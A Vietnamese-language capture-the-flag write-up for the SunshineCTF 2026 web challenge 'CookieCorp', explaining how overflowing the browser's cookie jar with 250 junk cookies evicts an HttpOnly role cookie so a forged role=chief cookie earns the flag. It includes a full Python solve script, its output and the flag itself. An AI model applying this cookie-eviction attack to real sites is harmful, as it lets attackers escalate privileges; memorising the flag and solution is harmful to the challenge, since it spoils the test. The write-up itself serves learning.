# CookieCorp - Web (Medium)

**Flag:** `sun{c00kie_jar_0verfl0w_ev1cts_the_chief}`
**URL:** `https://tomorrow.web.2026.sunshinectf.games/` · tác giả geo

## Đề bài

> "A Better Cookie for a Brighter Tomorrow!"
>
> Welcome to CookieCorp, the Space Age's finest custom-cookie fabrication service. Design a batch
> from any ingredients you can dream up, then submit it to our tireless robotic Quality Inspector.
> Every recipe is loaded straight into the fabrication mixer for a full inspection.
>
> Get your batch reviewed and you'll earn an official seal. But the truly legendary bakers, the
> ones whose recipes earn the Chief's Golden Seal, take home the grand prize. Only the Chief can
> award that seal, though. And the Chief is a very busy robot.

## Phân tích ban đầu

Ứng dụng cho phép người dùng (baker) tạo ra các công thức (recipe) gồm nhiều thành phần (ingredient) dưới dạng cặp khóa-giá trị `name=value`. Khi người dùng nộp công thức, một con bot kiểm duyệt (inspector) sẽ truy cập vào đường dẫn `/review/{id}` và kích hoạt đoạn mã `mixer.js`:

```javascript
// mixer.js - logic chính
function dispense(ing) {
  document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';
}

async function run() {
  // Biến mỗi ingredient thành một browser cookie
  for (var i = 0; i < recipe.ingredients.length; i++) {
    dispense(recipe.ingredients[i]);
  }
  // Gọi /api/seal để đóng dấu xác nhận - server sẽ kiểm tra cookie "role"
  var resp = await fetch('/api/seal', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ recipeId: recipe.id }),
  });
}
```

Các đặc điểm nổi bật của ứng dụng:
- Khi đăng nhập hoặc đăng ký, máy chủ sẽ gán một cookie với nội dung `role=baker; Path=/; HttpOnly; SameSite=Lax`.
- Cờ `HttpOnly` đóng vai trò ngăn chặn việc sử dụng `document.cookie` để ghi đè hoặc thay đổi giá trị của cookie `role` từ phía client.
- Bản thân bot kiểm duyệt có một `role` riêng biệt (không phải là `chief`), do đó nó chỉ nhận được dấu xác nhận tiêu chuẩn (standard seal).
- Máy chủ yêu cầu cookie phải có `role=chief` trong yêu cầu gửi tới `/api/seal` thì mới cấp phát Dấu Vàng (Golden Seal) chứa cờ (flag).
- Các ký tự đặc biệt như dấu chấm phẩy (`;`), khoảng trắng và dấu bằng (`=`) trong tên và giá trị của thành phần đều bị máy chủ loại bỏ, khiến cho việc tiêm (inject) các thuộc tính cookie trở nên bất khả thi.

## Chuỗi khai thác

Trình duyệt web có một cơ chế giới hạn số lượng cookie tối đa cho mỗi tên miền (khoảng 180 cookie đối với Chromium). Khi vượt quá giới hạn này, trình duyệt sẽ tự động loại bỏ (evict) những cookie cũ nhất, bao gồm cả những cookie được bảo vệ bằng cờ `HttpOnly`. Dựa vào đặc điểm này, ta có thể xây dựng chuỗi khai thác như sau:

1. Tạo một công thức chứa **250 thành phần rác** (với tên từ `x0000` đến `x0249`) nhằm mục đích làm đầy giới hạn lưu trữ cookie của trình duyệt (cookie jar).
2. Nối thêm một thành phần mang giá trị `role=chief` vào vị trí cuối cùng của danh sách.
3. Khi bot kiểm duyệt thực thi `mixer.js`: 250 cookie mới này sẽ làm tràn cookie jar, khiến cookie `role` có cờ HttpOnly cũ bị đẩy ra ngoài. Ngay sau đó, một cookie `role=chief` hoàn toàn mới sẽ được thiết lập thông qua JavaScript.
4. Bot gọi đến `/api/seal` với quyền `role=chief` vừa được ghi đè, và nhận về Golden Seal có chứa cờ hợp lệ.

```python
import requests
import time

BASE = "https://tomorrow.web.2026.sunshinectf.games"
s = requests.Session()

# Đăng ký và đăng nhập
s.post(f"{BASE}/register", json={"username": "solver_xyz", "password": "pass123"})

# Xây dựng 250 thành phần rác, kèm theo role=chief ở cuối cùng
ingredients = [{"name": f"x{i:04d}", "value": f"v{i}"} for i in range(250)]
ingredients.append({"name": "role", "value": "chief"})

# Lưu công thức
r = s.post(f"{BASE}/api/recipe", json={
    "title": "Cookie Overflow",
    "ingredients": ingredients
})
recipe_id = r.json()["id"]
print(f"Recipe: {recipe_id}")

# Nộp công thức để bot kiểm duyệt
s.post(f"{BASE}/api/recipe/{recipe_id}/submit")
print("Submitted, waiting for bot...")

# Chờ bot xử lý
time.sleep(15)

# Kiểm tra kết quả
r = s.get(f"{BASE}/recipe/{recipe_id}")
if "sun{" in r.text:
    idx = r.text.index("sun{")
    end = r.text.index("}", idx)
    print(f"FLAG: {r.text[idx:end+1]}")
else:
    print("No flag yet, try refreshing")
```

```
Recipe: 4f8fdb4ccbdc2f8b78ade6c6
Submitted, waiting for bot...
FLAG: sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```

## Flag
```
sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```
